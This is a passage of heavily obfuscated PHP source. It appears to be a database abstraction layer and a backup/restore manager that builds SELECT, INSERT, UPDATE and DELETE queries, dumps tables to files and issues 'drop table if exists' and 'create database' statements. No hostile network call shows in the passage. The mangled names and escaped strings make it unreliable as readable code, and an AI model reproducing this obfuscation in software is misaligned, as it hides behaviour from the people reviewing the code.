$ãşúš†Š); } } } $Ø—‰âüê = implode($¿Í œ¤É[50], $¦º¼‘×•); } return !empty($Ø—‰âüê) ? $¿Í œ¤É[1078] . $Ø—‰âüê : $¿Í œ¤É[12]; } protected function parseGroup($ˆïó³Œ) { $¦»¥ŞÙÁ =& $_SERVER[èùÙ¹Ïö]; return !empty($ˆïó³Œ) ? $¦»¥ŞÙÁ[1079] . $ˆïó³Œ : $¦»¥ŞÙÁ[12]; } protected function parseHaving($ï‘Å) { $Ûîşı±ï =& $_SERVER[èùÙ¹Ïö]; return !empty($ï‘Å) ? $Ûîşı±ï[1080] . $ï‘Å : $Ûîşı±ï[12]; } protected function parseComment($à÷ö×) { $¡“©¤ëñ =& $_SERVER[èùÙ¹Ïö]; return !empty($à÷ö×) ? $¡“©¤ëñ[1081] . $à÷ö× . $¡“©¤ëñ[1082] : $¡“©¤ëñ[12]; } protected function parseDistinct($Öµ¡ôÂ¥) { $ºÀßšÄÊ =& $_SERVER[èùÙ¹Ïö]; return !empty($Öµ¡ôÂ¥) ? $ºÀßšÄÊ[1083] : $ºÀßšÄÊ[12]; } protected function parseUnion($ÒãîÑ×˜) { $”šÛ²‡œ =& $_SERVER[èùÙ¹Ïö]; if (empty($ÒãîÑ×˜)) { return $”šÛ²‡œ[12]; } if (isset($ÒãîÑ×˜[$”šÛ²‡œ[394]])) { $Õ•âĞŠâ = $”šÛ²‡œ[1084]; unset($ÒãîÑ×˜[$”šÛ²‡œ[394]]); } else { $Õ•âĞŠâ = $”šÛ²‡œ[1085]; } foreach ($ÒãîÑ×˜ as $³Ç¸ëÔÁ) { $‰‡¸Ÿ¾…[] = $Õ•âĞŠâ . (is_array($³Ç¸ëÔÁ) ? $this->buildSelectSql($³Ç¸ëÔÁ) : $³Ç¸ëÔÁ); } return implode($”šÛ²‡œ[53], $‰‡¸Ÿ¾…); } public function insert($ŸË¤ìş–, $ˆ¹òëú = array(), $Î¦¾§Ü = false) { $Å”†¡ì­ =& $_SERVER[èùÙ¹Ïö]; $‘é°Ïô” = $Õ±Ñ¬ˆµ = array(); $this->model = $ˆ¹òëú[$Å”†¡ì­[327]]; foreach ($ŸË¤ìş– as $€û¿Øüå => $û’Çı¨) { if (is_array($û’Çı¨) && $Å”†¡ì­[343] == $û’Çı¨[0]) { $Õ±Ñ¬ˆµ[] = $this->parseKey($€û¿Øüå); $‘é°Ïô”[] = $û’Çı¨[1]; } elseif (is_scalar($û’Çı¨) || is_null($û’Çı¨)) { $Õ±Ñ¬ˆµ[] = $this->parseKey($€û¿Øüå); $‘é°Ïô”[] = $this->parseValue($û’Çı¨); } } $…ÊÈÓıÅ = ($Î¦¾§Ü ? $Å”†¡ì­[953] : $Å”†¡ì­[954]) . $Å”†¡ì­[955] . $this->parseTable($ˆ¹òëú[$Å”†¡ì­[325]]) . $Å”†¡ì­[949] . implode($Å”†¡ì­[50], $Õ±Ñ¬ˆµ) . $Å”†¡ì­[950] . implode($Å”†¡ì­[50], $‘é°Ïô”) . $Å”†¡ì­[951]; $…ÊÈÓıÅ .= $this->parseLock(isset($ˆ¹òëú[$Å”†¡ì­[884]]) ? $ˆ¹òëú[$Å”†¡ì­[884]] : !1); $…ÊÈÓıÅ .= $this->parseComment(!empty($ˆ¹òëú[$Å”†¡ì­[400]]) ? $ˆ¹òëú[$Å”†¡ì­[400]] : $Å”†¡ì­[12]); return $this->execute($…ÊÈÓıÅ, $this->parseBind(!empty($ˆ¹òëú[$Å”†¡ì­[331]]) ? $ˆ¹òëú[$Å”†¡ì­[331]] : array())); } public function selectInsert($ÚúÂ¯×Ç, $¯½˜ıû’, $ÛÜ¥•™– = array()) { $Íöâ½±’ =& $_SERVER[èùÙ¹Ïö]; $this->model = $ÛÜ¥•™–[$Íöâ½±’[327]]; if (is_string($ÚúÂ¯×Ç)) { $ÚúÂ¯×Ç = explode($Íöâ½±’[50], $ÚúÂ¯×Ç); } array_walk($ÚúÂ¯×Ç, array($this, $Íöâ½±’[952])); $½±ı‘« = $Íöâ½±’[1086] . $this->parseTable($¯½˜ıû’) . $Íöâ½±’[949] . implode($Íöâ½±’[50], $ÚúÂ¯×Ç) . $Íöâ½±’[1064]; $½±ı‘« .= $this->buildSelectSql($ÛÜ¥•™–); return $this->execute($½±ı‘«, $this->parseBind(!empty($ÛÜ¥•™–[$Íöâ½±’[331]]) ? $ÛÜ¥•™–[$Íöâ½±’[331]] : array())); } public function update($Áá½×İ…, $õ¾Ñëà) { $¹Ìİ–…‹ =& $_SERVER[èùÙ¹Ïö]; $this->model = $õ¾Ñëà[$¹Ìİ–…‹[327]]; $„ÙÏ‡ıë = $¹Ìİ–…‹[1087] . $this->parseTable($õ¾Ñëà[$¹Ìİ–…‹[325]]) . $this->parseSet($Áá½×İ…) . $this->parseWhere(!empty($õ¾Ñëà[$¹Ìİ–…‹[321]]) ? $õ¾Ñëà[$¹Ìİ–…‹[321]] : $¹Ìİ–…‹[12]) . $this->parseOrder(!empty($õ¾Ñëà[$¹Ìİ–…‹[411]]) ? $õ¾Ñëà[$¹Ìİ–…‹[411]] : $¹Ìİ–…‹[12]) . $this->parseLimit(!empty($õ¾Ñëà[$¹Ìİ–…‹[338]]) ? $õ¾Ñëà[$¹Ìİ–…‹[338]] : $¹Ìİ–…‹[12]) . $this->parseLock(isset($õ¾Ñëà[$¹Ìİ–…‹[884]]) ? $õ¾Ñëà[$¹Ìİ–…‹[884]] : !1) . $this->parseComment(!empty($õ¾Ñëà[$¹Ìİ–…‹[400]]) ? $õ¾Ñëà[$¹Ìİ–…‹[400]] : $¹Ìİ–…‹[12]); return $this->execute($„ÙÏ‡ıë, $this->parseBind(!empty($õ¾Ñëà[$¹Ìİ–…‹[331]]) ? $õ¾Ñëà[$¹Ìİ–…‹[331]] : array())); } public function delete($áèÒîÀü = array()) { $¥ØŞšş‹ =& $_SERVER[èùÙ¹Ïö]; $this->model = $áèÒîÀü[$¥ØŞšş‹[327]]; $úêæıÈõ = $¥ØŞšş‹[1088] . $this->parseTable($áèÒîÀü[$¥ØŞšş‹[325]]) . $this->parseWhere(!empty($áèÒîÀü[$¥ØŞšş‹[321]]) ? $áèÒîÀü[$¥ØŞšş‹[321]] : $¥ØŞšş‹[12]) . $this->parseOrder(!empty($áèÒîÀü[$¥ØŞšş‹[411]]) ? $áèÒîÀü[$¥ØŞšş‹[411]] : $¥ØŞšş‹[12]) . $this->parseLimit(!empty($áèÒîÀü[$¥ØŞšş‹[338]]) ? $áèÒîÀü[$¥ØŞšş‹[338]] : $¥ØŞšş‹[12]) . $this->parseLock(isset($áèÒîÀü[$¥ØŞšş‹[884]]) ? $áèÒîÀü[$¥ØŞšş‹[884]] : !1) . $this->parseComment(!empty($áèÒîÀü[$¥ØŞšş‹[400]]) ? $áèÒîÀü[$¥ØŞšş‹[400]] : $¥ØŞšş‹[12]); return $this->execute($úêæıÈõ, $this->parseBind(!empty($áèÒîÀü[$¥ØŞšş‹[331]]) ? $áèÒîÀü[$¥ØŞšş‹[331]] : array())); } public function select($ƒşÎ·ºñ = array()) { $ƒ¶Í¾ƒ™ =& $_SERVER[èùÙ¹Ïö]; $this->model = $ƒşÎ·ºñ[$ƒ¶Í¾ƒ™[327]]; $¦‚ÜÛ· = $this->buildSelectSql($ƒşÎ·ºñ); $Û«•ÂÀ = isset($ƒşÎ·ºñ[$ƒ¶Í¾ƒ™[395]]) ? $ƒşÎ·ºñ[$ƒ¶Í¾ƒ™[395]] : !1; if ($Û«•ÂÀ) { $÷ò‰«†” = is_string($Û«•ÂÀ[$ƒ¶Í¾ƒ™[96]]) ? $Û«•ÂÀ[$ƒ¶Í¾ƒ™[96]] : $ƒ¶Í¾ƒ™[1089] . md5($¦‚ÜÛ·); $Ö›ÌŸ·Š = think_cache($÷ò‰«†”, $ƒ¶Í¾ƒ™[12], $Û«•ÂÀ); if (!1 !== $Ö›ÌŸ·Š) { return $Ö›ÌŸ·Š; } } $ƒÓå“Ğü = $this->query($¦‚ÜÛ·, $this->parseBind(!empty($ƒşÎ·ºñ[$ƒ¶Í¾ƒ™[331]]) ? $ƒşÎ·ºñ[$ƒ¶Í¾ƒ™[331]] : array())); if ($Û«•ÂÀ && !1 !== $ƒÓå“Ğü) { think_cache($÷ò‰«†”, $ƒÓå“Ğü, $Û«•ÂÀ); } return $ƒÓå“Ğü; } public function buildSelectSql($€¤àõŞ† = array()) { $êÆÔÉû× =& $_SERVER[èùÙ¹Ïö]; if (isset($€¤àõŞ†[$êÆÔÉû×[399]])) { if (strpos($€¤àõŞ†[$êÆÔÉû×[399]], $êÆÔÉû×[50])) { list($ƒĞçºËÒ, $ç—¹–­Ü) = explode($êÆÔÉû×[50], $€¤àõŞ†[$êÆÔÉû×[399]]); } else { $ƒĞçºËÒ = $€¤àõŞ†[$êÆÔÉû×[399]]; } $ƒĞçºËÒ = $ƒĞçºËÒ ? $ƒĞçºËÒ : 1; $ç—¹–­Ü = isset($ç—¹–­Ü) ? $ç—¹–­Ü : (is_numeric($€¤àõŞ†[$êÆÔÉû×[338]]) ? $€¤àõŞ†[$êÆÔÉû×[338]] : 20); $£’Ë»¬Ä = $ç—¹–­Ü * ((int) $ƒĞçºËÒ - 1); $€¤àõŞ†[$êÆÔÉû×[338]] = $£’Ë»¬Ä . $êÆÔÉû×[50] . $ç—¹–­Ü; } if (think_config($êÆÔÉû×[1090])) { $¨É¬½àĞ = $êÆÔÉû×[1091] . md5(serialize($€¤àõŞ†)); $áÆÑîÃ = think_cache($¨É¬½àĞ); if ($áÆÑîÃ) { return $áÆÑîÃ; } } $€áÙôçÆ = $this->parseSql($this->selectSql, $€¤àõŞ†); $€áÙôçÆ .= $this->parseLock(isset($€¤àõŞ†[$êÆÔÉû×[884]]) ? $€¤àõŞ†[$êÆÔÉû×[884]] : !1); if (isset($¨É¬½àĞ)) { think_cache($¨É¬½àĞ, $€áÙôçÆ); } return $€áÙôçÆ; } public function parseSql($ğåç¸ç“, $èèÖÖªö = array()) { $™¨ìé´‹ =& $_SERVER[èùÙ¹Ïö]; $ğåç¸ç“ = str_replace(array($™¨ìé´‹[1092], $™¨ìé´‹[1093], $™¨ìé´‹[1094], $™¨ìé´‹[1095], $™¨ìé´‹[1096], $™¨ìé´‹[1097], $™¨ìé´‹[1098], $™¨ìé´‹[1099], $™¨ìé´‹[1100], $™¨ìé´‹[1101], $™¨ìé´‹[1102]), array($this->parseTable("{$èèÖÖªö[$™¨ìé´‹[325]]}"), $this->parseDistinct(isset($èèÖÖªö[$™¨ìé´‹[1103]]) ? $èèÖÖªö[$™¨ìé´‹[1103]] : !1), $this->parseField(!empty($èèÖÖªö[$™¨ìé´‹[319]]) ? $èèÖÖªö[$™¨ìé´‹[319]] : $™¨ìé´‹[205]), $this->parseJoin(!empty($èèÖÖªö[$™¨ìé´‹[328]]) ? $èèÖÖªö[$™¨ìé´‹[328]] : $™¨ìé´‹[12]), $this->parseWhere(!empty($èèÖÖªö[$™¨ìé´‹[321]]) ? $èèÖÖªö[$™¨ìé´‹[321]] : $™¨ìé´‹[12]), $this->parseGroup(!empty($èèÖÖªö[$™¨ìé´‹[550]]) ? $èèÖÖªö[$™¨ìé´‹[550]] : $™¨ìé´‹[12]), $this->parseHaving(!empty($èèÖÖªö[$™¨ìé´‹[1104]]) ? $èèÖÖªö[$™¨ìé´‹[1104]] : $™¨ìé´‹[12]), $this->parseOrder(!empty($èèÖÖªö[$™¨ìé´‹[411]]) ? $èèÖÖªö[$™¨ìé´‹[411]] : $™¨ìé´‹[12]), $this->parseLimit(!empty($èèÖÖªö[$™¨ìé´‹[338]]) ? $èèÖÖªö[$™¨ìé´‹[338]] : $™¨ìé´‹[12]), $this->parseUnion(!empty($èèÖÖªö[$™¨ìé´‹[393]]) ? $èèÖÖªö[$™¨ìé´‹[393]] : $™¨ìé´‹[12]), $this->parseComment(!empty($èèÖÖªö[$™¨ìé´‹[400]]) ? $èèÖÖªö[$™¨ìé´‹[400]] : $™¨ìé´‹[12])), $ğåç¸ç“); return $ğåç¸ç“; } public function getLastSql($ŸÀõ¥Á = '') { return $ŸÀõ¥Á ? $this->modelSql[$ŸÀõ¥Á] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($„¾®Öô) { return addslashes($„¾®Öô); } public function setModel($ÂË¦è¯…) { $this->model = $ÂË¦è¯…; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ÃÂãøÅ = array()) { $›ÊÍï¢° =& $_SERVER[èùÙ¹Ïö]; if (empty($ÃÂãøÅ)) { $ÃÂãøÅ = $GLOBALS[$›ÊÍï¢°[6]][$›ÊÍï¢°[21]]; } $this->database = $ÃÂãøÅ; } public function model($éºŠÔî = '') { return new ModelBase($éºŠÔî, $_SERVER[èùÙ¹Ïö][12], $this->database); } public function db($îïÅŸ”ş = false) { $ìü©ñä¿ =& $_SERVER[èùÙ¹Ïö]; $’½üÖ = array_change_key_case($this->database); if ($this->dbType() == $ìü©ñä¿[13] || !$îïÅŸ”ş) { return $this->model()->db(); } $ùß‚í = $’½üÖ[$ìü©ñä¿[1018]]; $’½üÖ[$ìü©ñä¿[1018]] = $ìü©ñä¿[12]; if ($’½üÖ[$ìü©ñä¿[1013]] == $ìü©ñä¿[1010]) { $ÊšæùÊÒ = $’½üÖ[$ìü©ñä¿[1019]]; $’½üÖ[$ìü©ñä¿[1019]] = substr($ÊšæùÊÒ, 0, strrpos($ÊšæùÊÒ, $ìü©ñä¿[1105])); } $this->database = $’½üÖ; $¶à¦‰¡° = $this->model()->db(); try { $ù’È˜Ú = $¶à¦‰¡°->execute("\x73\150\157\167\40\144\x61\164\x61\142\x61\163\145\x73\40\x6c\x69\153\145\x20\x27{$ùß‚í}\x27"); } catch (Exception $¤÷·É§©) { } if (!$ù’È˜Ú) { $¶à¦‰¡°->execute("\143\x72\x65\141\x74\x65\40\x64\141\164\x61\x62\x61\163\x65\40\x60{$ùß‚í}\140"); } $’½üÖ[$ìü©ñä¿[1018]] = $ùß‚í; if ($’½üÖ[$ìü©ñä¿[1013]] == $ìü©ñä¿[1010]) { $’½üÖ[$ìü©ñä¿[1019]] .= $ìü©ñä¿[1105] . $ùß‚í; } $this->database = $’½üÖ; $¶à¦‰¡°->execute("\x75\x73\x65\x20\140{$ùß‚í}\140"); return $¶à¦‰¡°; } public function createTable($š†Ùç´÷, &$Š­àÁ·) { $éôùÔØ¶ =& $_SERVER[èùÙ¹Ïö]; if (!IO::exist($š†Ùç´÷)) { ActionCall($éôùÔØ¶[1106], !0, 0); show_json(LNG($éôùÔØ¶[1107]), !1); } $ëÈ˜şâå = $this->model()->db(); $èç¿ø÷‹ = sqlSplit(IO::getContent($š†Ùç´÷)); foreach ($èç¿ø÷‹ as $’î‘È®³) { $çëÕÓù = stripos($’î‘È®³, $éôùÔØ¶[1108]) === 0; if ($çëÕÓù) { $Š­àÁ·->task[$éôùÔØ¶[826]] += 1; } $ëÈ˜şâå->execute($’î‘È®³); if ($çëÕÓù) { preg_match($éôùÔØ¶[1109], $’î‘È®³, $ø®€†Ï¤); $Š­àÁ·->task[$éôùÔØ¶[1110]] = $ø®€†Ï¤[1]; $Š­àÁ·->update(1); } } } public function insertTable($­¦‚˜šÆ, &$Ì¦„·´) { $Óé†¯ùƒ =& $_SERVER[èùÙ¹Ïö]; $¨Õ—•Ã = $this->model()->db(); $ ÆÒ»Ï™ = $‚Ğš©à ? array($‚Ğš©à) : $¨Õ—•Ã->getTables(); foreach ($­¦‚˜šÆ as $‘Ù¤Ø·†) { $‚Ğš©à = basename($‘Ù¤Ø·†, $Óé†¯ùƒ[828]); if (!in_array($‚Ğš©à, $ ÆÒ»Ï™)) { continue; } $Ì¦„·´->task[$Óé†¯ùƒ[1110]] = $‚Ğš©à; if (get_filesize($‘Ù¤Ø·†) == 0) { continue; } $İ÷õ·„µ = $this->sqlToDb($‘Ù¤Ø·†, $Ì¦„·´); if (!$İ÷õ·„µ) { ActionCall($Óé†¯ùƒ[1106], !0, 0); show_json(LNG($Óé†¯ùƒ[1111]) . "\133{$‚Ğš©à}\135", !1); } } } public function sqlFromDb($î¨ãšÛ˜, $É‰ŞÇ±, &$úíéìŒ§, $èä’§ÂÒ = '') { if ($úíéìŒ§) { $úíéìŒ§->task[$_SERVER[èùÙ¹Ïö][1110]] = $î¨ãšÛ˜; } $‰¿Ü„œˆ = $this->model($î¨ãšÛ˜); $ÛÅæÛ´• = 0; $ª¦İ†¡ = 0; $İŞÛ¡ÄÅ = 10000; $ãªó›âÀ = fopen($É‰ŞÇ±, $_SERVER[èùÙ¹Ïö][1112]); $Ø·à¡š¿ = $‰¿Ü„œˆ->getPk(); $õÈÑßå´ = $‰¿Ü„œˆ->getDbFields(); $˜ÏïÒô = $_SERVER[èùÙ¹Ïö][12]; if ($GLOBALS[$_SERVER[èùÙ¹Ïö][827]] && in_array($î¨ãšÛ˜, array($_SERVER[èùÙ¹Ïö][1113], $_SERVER[èùÙ¹Ïö][1114]))) { $˜ÏïÒô = $î¨ãšÛ˜; } do { $‰Î”¾ = array($Ø·à¡š¿ => array($_SERVER[èùÙ¹Ïö][1060], $ª¦İ†¡)); $è–è´–ê = $‰¿Ü„œˆ->where($‰Î”¾)->field($õÈÑßå´)->order($Ø·à¡š¿ . $_SERVER[èùÙ¹Ïö][1115])->limit($İŞÛ¡ÄÅ)->select(); $è–è´–ê = !empty($è–è´–ê) ? $è–è´–ê : array(); if (!($¥º¶Ğèç = count($è–è´–ê))) { break; } $¹ƒşı”“ = end($è–è´–ê); $ª¦İ†¡ = $¹ƒşı”“[$Ø·à¡š¿]; $¢±µÚÂÒ = array(); foreach ($è–è´–ê as $¥Ô˜•çÀ) { if ($˜ÏïÒô) { if ($î¨ãšÛ˜ == $_SERVER[èùÙ¹Ïö][1113]) { if ($¥Ô˜•çÀ[$_SERVER[èùÙ¹Ïö][33]] == $_SERVER[èùÙ¹Ïö][1116]) { $€ÇÑ“Ê = json_decode($¥Ô˜•çÀ[$_SERVER[èùÙ¹Ïö][420]], !0); if ($€ÇÑ“Ê[$_SERVER[èùÙ¹Ïö][32]] == $GLOBALS[$_SERVER[èùÙ¹Ïö][827]] && $€ÇÑ“Ê[$_SERVER[èùÙ¹Ïö][790]] != 1) { continue; } } } else { if ($¥Ô˜•çÀ[$_SERVER[èùÙ¹Ïö][33]] == $_SERVER[èùÙ¹Ïö][1117] && $¥Ô˜•çÀ[$_SERVER[èùÙ¹Ïö][96]] == $_SERVER[èùÙ¹Ïö][819]) { continue; } } } if ($èä’§ÂÒ) { $¥Ô˜•çÀ[$_SERVER[èùÙ¹Ïö][86]] = "\x7b\x69\x6f\x3a{$èä’§ÂÒ}\175" . substr($¥Ô˜•çÀ[$_SERVER[èùÙ¹Ïö][86]], strlen("\173\151\157\x3a{$¥Ô˜•çÀ[$_SERVER[èùÙ¹Ïö][857]]}\x7d")); $¥Ô˜•çÀ[$_SERVER[èùÙ¹Ïö][857]] = $èä’§ÂÒ; } $¢±µÚÂÒ[] = $_SERVER[èùÙ¹Ïö][1118] . $this->sqlEncode($¥Ô˜•çÀ) . $_SERVER[èùÙ¹Ïö][1119]; } $Ó„ˆáó = "\111\x4e\123\105\x52\124\40\111\x4e\x54\x4f\40\x60{$î¨ãšÛ˜}\x60\x20\50\140" . implode($_SERVER[èùÙ¹Ïö][1120], $õÈÑßå´) . $_SERVER[èùÙ¹Ïö][1121]; fwrite($ãªó›âÀ, $Ó„ˆáó . implode($_SERVER[èùÙ¹Ïö][1122], $¢±µÚÂÒ) . $_SERVER[èùÙ¹Ïö][73] . PHP_EOL); $ÛÅæÛ´• += $¥º¶Ğèç; if ($úíéìŒ§) { $úíéìŒ§->update($¥º¶Ğèç); } } while ($İŞÛ¡ÄÅ == $¥º¶Ğèç); fclose($ãªó›âÀ); return $ÛÅæÛ´•; } public function sqlToDb($ï‡¯ÀÖ, &$Í¡‘Üµ§) { $’—ŞªïÅ =& $_SERVER[èùÙ¹Ïö]; $ğş÷ù = $this->model()->db(); $ø…Òä = @fopen($ï‡¯ÀÖ, $’—ŞªïÅ[1123]); if (!$ø…Òä) { return !1; } $ö—ÂßÁº = 0; $Ÿ’€Ğş» = $’—ŞªïÅ[12]; $«óßÄª = array(); $Í´¦åŒš = $this->dbType(); $–çÅ…Æ§ = $Í´¦åŒš == $’—ŞªïÅ[13] ? 500 : 2000; $Îş“ç = basename($ï‡¯ÀÖ, $’—ŞªïÅ[828]); $ı§«áÙÄ = 0; $ìë›ŞÓ¡ = 4194304 - 104858; $È¯’ã¦¾ = 1000000 - 104858; while (!feof($ø…Òä)) { $±àóÚ§… = trim(fgets($ø…Òä)); if (!$±àóÚ§…) { continue; } $“ÉÖŒşä = $this->sqlDecode($±àóÚ§…, $Í´¦åŒš, $Îş“ç); if (stripos($“ÉÖŒşä, $’—ŞªïÅ[401]) === 0) { if (!$Ÿ’€Ğş») { $Ÿ’€Ğş» = $“ÉÖŒşä . $’—ŞªïÅ[53]; } continue; } if ($Í¡‘Üµ§) { $Í¡‘Üµ§->task[$’—ŞªïÅ[826]] += 1; } $ö—ÂßÁº++; $«óßÄª[] = rtrim(rtrim(trim($“ÉÖŒşä), $’—ŞªïÅ[50]), $’—ŞªïÅ[73]); $•óµ—œ = null; $“½ÏÚ•½ = strlen($“ÉÖŒşä); $ı§«áÙÄ += $“½ÏÚ•½; if ($ı§«áÙÄ >= ($–çÅ…Æ§ == 500 ? $È¯’ã¦¾ : $ìë›ŞÓ¡)) { $•óµ—œ = array_pop($«óßÄª); if ($ö—ÂßÁº > 1) { $ö—ÂßÁº--; } } if ($ö—ÂßÁº >= $–çÅ…Æ§ || $•óµ—œ) { $“ÉÖŒşä = $Ÿ’€Ğş» . implode($’—ŞªïÅ[50], $«óßÄª); if (!$ğş÷ù->execute($“ÉÖŒşä)) { return !1; } if ($Í¡‘Üµ§) { $Í¡‘Üµ§->update($ö—ÂßÁº); } $«óßÄª = array(); $ö—ÂßÁº = 0; $ı§«áÙÄ = 0; if ($•óµ—œ) { $«óßÄª = array($•óµ—œ); $ö—ÂßÁº = 1; $ı§«áÙÄ = $“½ÏÚ•½; } } } fclose($ø…Òä); if (!empty($«óßÄª)) { $“ÉÖŒşä = $Ÿ’€Ğş» . implode($’—ŞªïÅ[50], $«óßÄª); if (!$ğş÷ù->execute($“ÉÖŒşä)) { return !1; } if ($Í¡‘Üµ§) { $Í¡‘Üµ§->update($ö—ÂßÁº); } } return !0; } public function dropTable($Ÿß¸¬Àú = null) { $ÙşÒÒÅ¨ = $this->model()->db(); $úıÛ“ª = $Ÿß¸¬Àú ? array($Ÿß¸¬Àú) : $ÙşÒÒÅ¨->getTables(); if (!$úıÛ“ª) { return; } foreach ($úıÛ“ª as $Ÿß¸¬Àú) { if ($Ÿß¸¬Àú) { $Ÿß¸¬Àú = strtolower($Ÿß¸¬Àú); } else { continue; } $ÙşÒÒÅ¨->execute("\144\x72\157\x70\x20\x74\141\x62\154\x65\40\151\x66\40\145\170\151\163\x74\x73\x20\140{$Ÿß¸¬Àú}\140"); } } private function sqlEncode($¥İß»ÄÚ) { $Õ·²ùú =& $_SERVER[èùÙ¹Ïö]; $¼ëûŒ¯š = array(); foreach ($¥İß»ÄÚ as $‰Å§ë‹Õ) { if (is_array($‰Å§ë‹Õ)) { $‰Å§ë‹Õ = json_encode_force($‰Å§ë‹Õ); } $‰Å§ë‹Õ = addslashes($‰Å§ë‹Õ); $‰Å§ë‹Õ = str_replace(array($Õ·²ùú[1124], $Õ·²ùú[248]), array($Õ·²ùú[1125], $Õ·²ùú[1126]), $‰Å§ë‹Õ); $¼ëûŒ¯š[] = str_replace($Õ·²ùú[58], $Õ·²ùú[1127], $‰Å§ë‹Õ); } return $Õ·²ùú[58] . implode($Õ·²ùú[1128], $¼ëûŒ¯š) . $Õ·²ùú[58]; } private function sqlDecode($ä„¸ìÂ‘, $­›äªù¤, $ä‡Óú = '') { $ĞşÆé¤Å =& $_SERVER[èùÙ¹Ïö]; $ä„¸ìÂ‘ = str_replace(array($ĞşÆé¤Å[1125], $ĞşÆé¤Å[1126]), array($ĞşÆé¤Å[1124], $ĞşÆé¤Å[248]), $ä„¸ìÂ‘); if ($­›äªù¤ == $ĞşÆé¤Å[13]) { return $ä‡Óú != $ĞşÆé¤Å[1129] ? stripslashes($ä„¸ìÂ‘) : $ä„¸ìÂ‘; } if ($ä‡Óú == $ĞşÆé¤Å[1129]) { $ä„¸ìÂ‘ = str_replace($ĞşÆé¤Å[1130], $ĞşÆé¤Å[120], stripslashes($ä„¸ìÂ‘)); } return $ä„¸ìÂ‘; } public function getSqlFile($°Å“³¿í = '') { $„•£Ä =& $_SERVER[èùÙ¹Ïö]; $ú¥õ”×’ = $this->dbType(!0); $Ö§İ±Ñ = CONTROLLER_DIR . "\151\156\x73\x74\x61\154\x6c\57\144\141\x74\x61\57{$ú¥õ”×’}\x2e\x73\161\154"; $ğ­¼Ü† = file_get_contents($Ö§İ±Ñ); $ìø•¸¯ù = $„•£Ä[1131] . ($ú¥õ”×’ == $„•£Ä[844] ? $„•£Ä[1132] : $„•£Ä[1133]) . $„•£Ä[1134]; preg_match_all($ìø•¸¯ù, $ğ­¼Ü†, $ƒ¥ë¸á¾); $éûÇ¯—Ş = $ƒ¥ë¸á¾[1]; $ì‡ñÙòˆ = $this->model()->db(); $ï©©É˜Ğ = $ì‡ñÙòˆ->getTables(); $ºêŞ£¨ñ = TEMP_FILES . $„•£Ä[1135] . date($„•£Ä[257]) . $„•£Ä[8]; del_dir($ºêŞ£¨ñ); mk_dir($ºêŞ£¨ñ); $¶ú°¹²ì = $ºêŞ£¨ñ . $„•£Ä[1136]; $Ò°–¯ğ¹ = $ºêŞ£¨ñ . $„•£Ä[1137]; $ÒéÊ¸Š• = $ú¥õ”×’ == $„•£Ä[13] ? $„•£Ä[844] : $„•£Ä[13]; IO::copy(CONTROLLER_DIR . "\151\156\x73\164\141\154\x6c\57\x64\141\164\x61\x2f{$ÒéÊ¸Š•}\x2e\163\161\154", $ºêŞ£¨ñ); @touch($ºêŞ£¨ñ . $ú¥õ”×’ . $„•£Ä[828]); $À¡Ûê»œ = fopen($¶ú°¹²ì, $„•£Ä[1112]); $»í‘‰¹¤ = fopen($Ò°–¯ğ¹, $„•£Ä[1112]); if ($ú¥õ”×’ == $„•£Ä[13]) { $ï©©É˜Ğ = array_diff($ï©©É˜Ğ, array($„•£Ä[824], $„•£Ä[825])); $„œøğÙ­ = array($„•£Ä[1138], $„•£Ä[1139], $„•£Ä[1140]); fwrite($»í‘‰¹¤, implode(PHP_EOL, $„œøğÙ­) . PHP_EOL . PHP_EOL); foreach ($ï©©É˜Ğ as $ú•ÂÌ†£) { $üõ‚…½à = $this->sqlFromSqlite($ú•ÂÌ†£); if (!$üõ‚…½à[$„•£Ä[13]]) { continue; } fwrite($»í‘‰¹¤, $üõ‚…½à[$„•£Ä[13]] . PHP_EOL . PHP_EOL); if (!in_array($ú•ÂÌ†£, $éûÇ¯—Ş)) { fwrite($À¡Ûê»œ, $üõ‚…½à[$„•£Ä[844]] . PHP_EOL . PHP_EOL); } } } else { foreach ($ï©©É˜Ğ as $ú•ÂÌ†£) { $üõ‚…½à = $this->sqlFromMysql($ú•ÂÌ†£); if (!$üõ‚…½à[$„•£Ä[844]]) { continue; } fwrite($À¡Ûê»œ, $üõ‚…½à[$„•£Ä[844]] . PHP_EOL . PHP_EOL); if (!in_array($ú•ÂÌ†£, $éûÇ¯—Ş)) { fwrite($»í‘‰¹¤, $üõ‚…½à[$„•£Ä[13]] . PHP_EOL . PHP_EOL); } } } fclose($À¡Ûê»œ); fclose($»í‘‰¹¤); $ğ­¼Ü† = array($„•£Ä[844] => $¶ú°¹²ì, $„•£Ä[13] => $Ò°–¯ğ¹); return $°Å“³¿í ? $ğ­¼Ü†[$°Å“³¿í] : $ğ­¼Ü†; } public function dbType($ªÊ£¡¦» = false) { $õ¼÷Ê•„ =& $_SERVER[èùÙ¹Ïö]; $ı¾îëşô = $ªÊ£¡¦» ? $GLOBALS[$õ¼÷Ê•„[6]][$õ¼÷Ê•„[21]] : $this->database; $ı¾îëşô = array_change_key_case($ı¾îëşô); $Ûã¯ËÓÇ = $ı¾îëşô[$õ¼÷Ê•„[1013]]; if ($Ûã¯ËÓÇ == $õ¼÷Ê•„[1010]) { $®÷Š¼‡É = explode($õ¼÷Ê•„[4], $ı¾îëşô[$õ¼÷Ê•„[1019]]); $Ûã¯ËÓÇ = $®÷Š¼‡É[0]; } $‡ã‹êÎÀ = array($õ¼÷Ê•„[1141] => $õ¼÷Ê•„[13], $õ¼÷Ê•„[958] => $õ¼÷Ê•„[844]); if (isset($‡ã‹êÎÀ[$Ûã¯ËÓÇ])) { $Ûã¯ËÓÇ = $‡ã‹êÎÀ[$Ûã¯ËÓÇ]; } return $Ûã¯ËÓÇ; } public function sqlFromMysql($ºÊÙÓñë, $Û›çÂÆ» = '') { $£·ş§ÄÁ =& $_SERVER[èùÙ¹Ïö]; $£Ì€ƒº¾ = $this->model()->db(); $òÃ¦çŠĞ = $£Ì€ƒº¾->query($£·ş§ÄÁ[1142] . $ºÊÙÓñë . $£·ş§ÄÁ[431]); if (!$òÃ¦çŠĞ || !$òÃ¦çŠĞ[0]) { return !1; } $ÉËöºòÔ = _get($òÃ¦çŠĞ[0], $£·ş§ÄÁ[1143], $£·ş§ÄÁ[12]); if (!$ÉËöºòÔ) { return !1; } $ŠÈ ˜½º = "\x44\x52\117\120\x20\124\x41\x42\114\x45\x20\x49\106\x20\105\130\x49\123\x54\x53\40\x60{$ºÊÙÓñë}\140\73" . PHP_EOL . 